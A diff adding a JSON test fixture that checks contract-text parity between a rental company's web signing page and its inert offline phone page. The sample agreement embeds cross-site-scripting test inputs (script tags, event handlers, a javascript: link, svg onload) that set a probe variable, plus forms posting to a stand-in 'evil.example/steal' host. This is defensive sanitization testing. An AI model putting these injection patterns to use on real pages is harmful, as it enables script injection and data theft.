@@ -1,0 +1,62 @@
+{
+    "_comment": "Dispatch offline Phase 5 hardening — contractual-text parity between the web signing page and the phone's inert local page. `agreement` is the frozen payload (identity computed independently in Python). `visible_text`: every phrase a reader of the web page sees; the phone must show every one. `phone_also_shows`: wording the phone shows although a browser would not (a blocked remote image's alt text). `never_visible`: text neither page shows (script output, template, noscript under scripting, iframe fallback, SVG <title> tooltip). `probe`: the global any executed content would set — it must stay undefined on the phone. `approvals_required`: checkboxes both pages render. `web_content_html`: Laravel's own render (TermsAgreement::contentHtml), pinned by the backend test. Sanitization is presentation only: the identity never changes.",
+    "agreement": {
+        "identity": "v1:db84e89b95e644801d10643ce0a35ebe4ec75c58213bcf5f383f15ca986a1470",
+        "order_unique_id": "ORD-PARITY-0001",
+        "order_number": "#PARITY",
+        "customer_name": "Pat O'Brien & Sons \"Test\" <b>",
+        "approvals_required": 4,
+        "entries": [
+            {
+                "is_global": true,
+                "content": "<h2>Rental Agreement</h2>\n<p>This agreement is between <strong>Kabba Rentals</strong> and the customer named below. <em>Please read every clause.</em></p>\n<ol><li>Clause 1 (a list): Equipment must be returned clean.</li><li>Clause 2 (a list): Fuel is charged at the posted rate.</li></ol>\n<table><tr><th>Item</th><th>Fee</th></tr><tr><td>Clause 3 (a table): Cleaning</td><td>$75 per unit</td></tr></table>\n<form action=\"https://evil.example/steal\" method=\"post\"><p>Clause 4 (inside a form): The customer is liable for damage.</p><form><p>Clause 5 (a nested form): Nested wording stays.</p></form></form>\n<button type=\"submit\" onclick=\"window.__kabbaProbe = 1\">Clause 6 (a button): I accept the damage waiver terms.</button>\n<input type=\"submit\" value=\"Clause 7 (a submit input): The deposit is non-refundable.\">\n<p><a href=\"https://example.com/policy\" target=\"_blank\">Clause 8 (a link): Read the cancellation policy.</a></p>\n<p><a href=\"javascript:window.__kabbaProbe = 2\">Clause 9 (a javascript: link): Payment is due on delivery.</a></p>\n<svg width=\"320\" height=\"40\" onload=\"window.__kabbaProbe = 3\"><title>SVG-TOOLTIP-TEXT</title><text x=\"0\" y=\"20\">Clause 10 (SVG text): Insurance is mandatory.</text><script>window.__kabbaProbe = 4</script></svg>\n<script>window.__kabbaProbe = 5; document.write(\"INJECTED-SCRIPT-TEXT\");</script>\n<p onclick=\"window.__kabbaProbe = 6\" onmouseover=\"window.__kabbaProbe = 7\">Clause 11 (with handlers): Tampering voids the agreement.</p>\n<img src=\"https://example.com/terms.png\" onerror=\"window.__kabbaProbe = 8\" alt=\"Clause 12 (a remote image's alt text): Photo ID required.\">\n<iframe src=\"https://example.com/embedded\">IFRAME-FALLBACK-TEXT</iframe>\n<object data=\"https://example.com/terms.swf\">Clause 13 (object fallback): The customer read the attached schedule.</object>\n<template><p>TEMPLATE-TEXT</p></template>\n<noscript>NOSCRIPT-TEXT</noscript>\n<style>.kabba-parity { color: #333; }</style>\n[product_terms][/product_terms]",
+                "signature_block": "<p>Customer: [customer_name][/customer_name]</p><p>[customer_signature][/customer_signature]</p>"
+            },
+            {
+                "is_global": false,
+                "content": "<h3>Skid Steer Addendum</h3>\n<p>Clause 14 (an addendum): The operator must be 18 or older.</p>\n<p>Clause 15 (a plain approval):</p>[customer_approval][/customer_approval]\n<a href=\"https://example.com/addendum\"><span>Clause 16 (an approval inside a link): I inspected the machine.</span>[customer_approval][/customer_approval]</a>\n<form action=\"https://evil.example/x\"><p>Clause 17 (an approval inside a form): I received the manual.</p>[customer_approval][/customer_approval]</form>\n<button type=\"button\">Clause 18 (an approval inside a button): I accept the safety briefing. [customer_approval][/customer_approval]</button>",
+                "signature_block": ""
+            }
+        ]
+    },
+    "visible_text": [
+        "Rental Agreement",
+        "Kabba Rentals",
+        "Please read every clause.",
+        "Clause 1 (a list): Equipment must be returned clean.",
+        "Clause 2 (a list): Fuel is charged at the posted rate.",
+        "Clause 3 (a table): Cleaning",
+        "$75 per unit",
+        "Clause 4 (inside a form): The customer is liable for damage.",
+        "Clause 5 (a nested form): Nested wording stays.",
+        "Clause 6 (a button): I accept the damage waiver terms.",
+        "Clause 7 (a submit input): The deposit is non-refundable.",
+        "Clause 8 (a link): Read the cancellation policy.",
+        "Clause 9 (a javascript: link): Payment is due on delivery.",
+        "Clause 10 (SVG text): Insurance is mandatory.",
+        "Clause 11 (with handlers): Tampering voids the agreement.",
+        "Clause 13 (object fallback): The customer read the attached schedule.",
+        "Skid Steer Addendum",
+        "Clause 14 (an addendum): The operator must be 18 or older.",
+        "Clause 15 (a plain approval):",
+        "Clause 16 (an approval inside a link): I inspected the machine.",
+        "Clause 17 (an approval inside a form): I received the manual.",
+        "Clause 18 (an approval inside a button): I accept the safety briefing.",
+        "Customer: Pat O'Brien & Sons \"Test\" <b>"
+    ],
+    "phone_also_shows": [
+        "Clause 12 (a remote image's alt text): Photo ID required."
+    ],
+    "never_visible": [
+        "INJECTED-SCRIPT-TEXT",
+        "TEMPLATE-TEXT",
+        "NOSCRIPT-TEXT",
+        "IFRAME-FALLBACK-TEXT",
+        "SVG-TOOLTIP-TEXT",
+        "__kabbaProbe"
+    ],
+    "probe": "__kabbaProbe",
+    "approval_label": "Customer Approval Required",
+    "sign_label": "CLICK HERE TO SIGN",
+    "web_content_html": "<h2>Rental Agreement</h2>\n<p>This agreement is between <strong>Kabba Rentals</strong> and the customer named below. <em>Please read every clause.</em></p>\n<ol><li>Clause 1 (a list): Equipment must be returned clean.</li><li>Clause 2 (a list): Fuel is charged at the posted rate.</li></ol>\n<table><tr><th>Item</th><th>Fee</th></tr><tr><td>Clause 3 (a table): Cleaning</td><td>$75 per unit</td></tr></table>\n<form action=\"https://evil.example/steal\" method=\"post\"><p>Clause 4 (inside a form): The customer is liable for damage.</p><form><p>Clause 5 (a nested form): Nested wording stays.</p></form></form>\n<button type=\"submit\" onclick=\"window.__kabbaProbe = 1\">Clause 6 (a button): I accept the damage waiver terms.</button>\n<input type=\"submit\" value=\"Clause 7 (a submit input): The deposit is non-refundable.\">\n<p><a href=\"https://example.com/policy\" target=\"_blank\">Clause 8 (a link): Read the cancellation policy.</a></p>\n<p><a href=\"javascript:window.__kabbaProbe = 2\">Clause 9 (a javascript: link): Payment is due on delivery.</a></p>\n<svg width=\"320\" height=\"40\" onload=\"window.__kabbaProbe = 3\"><title>SVG-TOOLTIP-TEXT</title><text x=\"0\" y=\"20\">Clause 10 (SVG text): Insurance is mandatory.</text><script>window.__kabbaProbe = 4</script></svg>\n<script>window.__kabbaProbe = 5; document.write(\"INJECTED-SCRIPT-TEXT\");</script>\n<p onclick=\"window.__kabbaProbe = 6\" onmouseover=\"window.__kabbaProbe = 7\">Clause 11 (with handlers): Tampering voids the agreement.</p>\n<img src=\"https://example.com/terms.png\" onerror=\"window.__kabbaProbe = 8\" alt=\"Clause 12 (a remote image's alt text): Photo ID required.\">\n<iframe src=\"https://example.com/embedded\">IFRAME-FALLBACK-TEXT</iframe>\n<object data=\"https://example.com/terms.swf\">Clause 13 (object fallback): The customer read the attached schedule.</object>\n<template><p>TEMPLATE-TEXT</p></template>\n<noscript>NOSCRIPT-TEXT</noscript>\n<style>.kabba-parity { color: #333; }</style>\n<h3>Skid Steer Addendum</h3>\n<p>Clause 14 (an addendum): The operator must be 18 or older.</p>\n<p>Clause 15 (a plain approval):</p><div>\n    <label for=\"customer_approval\" class=\"flex items-center space-x-2\">\n        <input\n            name=\"customer_approval[]\"\n            type=\"checkbox\"\n            class=\"customer_initials_checkbox h-4 w-4\"\n            required\n        >\n        <span class=\"font-semibold text-red-600\">Customer Approval Required</span>\n    </label>\n</div>\n<a href=\"https://example.com/addendum\"><span>Clause 16 (an approval inside a link): I inspected the machine.</span><div>\n    <label for=\"customer_approval\" class=\"flex items-center space-x-2\">\n        <input\n            name=\"customer_approval[]\"\n            type=\"checkbox\"\n            class=\"customer_initials_checkbox h-4 w-4\"\n            required\n        >\n        <span class=\"font-semibold text-red-600\">Customer Approval Required</span>\n    </label>\n</div></a>\n<form action=\"https://evil.example/x\"><p>Clause 17 (an approval inside a form): I received the manual.</p><div>\n    <label for=\"customer_approval\" class=\"flex items-center space-x-2\">\n        <input\n            name=\"customer_approval[]\"\n            type=\"checkbox\"\n            class=\"customer_initials_checkbox h-4 w-4\"\n            required\n        >\n        <span class=\"font-semibold text-red-600\">Customer Approval Required</span>\n    </label>\n</div></form>\n<button type=\"button\">Clause 18 (an approval inside a button): I accept the safety briefing. <div>\n    <label for=\"customer_approval\" class=\"flex items-center space-x-2\">\n        <input\n            name=\"customer_approval[]\"\n            type=\"checkbox\"\n            class=\"customer_initials_checkbox h-4 w-4\"\n            required\n        >\n        <span class=\"font-semibold text-red-600\">Customer Approval Required</span>\n    </label>\n</div></button><p>Customer: Pat O&#039;Brien &amp; Sons &quot;Test&quot; &lt;b&gt;</p><p><div class=\"flex items-center gap-x-1\">\n    <div class=\"flex flex-col items-start gap-y-2 w-full\">\n        <div id=\"signature-preview-div\" class=\"h-32 w-50 hidden\">\n            <div class=\"flex items-center gap-x-2\">\n                <img id=\"signature-preview\" src=\"\" alt=\"Signature Preview\" class=\"h-32 w-auto rounded border border-gray-300 object-scale-down\">\n                <button type=\"button\" id=\"close-signature-btn\"\n                    class=\"text-gray-500 hover:text-gray-700 px-2 py-1 rounded text-2xl flex items-center justify-center\"\n                    aria-label=\"Close signature preview\" onclick=\"closeSignaturePreview()\">\n                    &times;\n                </button>\n            </div>\n            <input type=\"hidden\" name=\"signature\" id=\"signature_input\" value=\"\">\n        </div>\n        <button type=\"button\" id=\"open-signature-btn\"\n            class=\"border-0 bg-yellow-400 px-6 py-4 font-medium rounded-lg hover:bg-yellow-300 transition-all duration-500 ease-in-out\"\n            aria-label=\"Open signature modal\" onclick=\"openModal()\">\n            CLICK HERE TO SIGN\n        </button>\n    </div>\n</div></p>"
+}
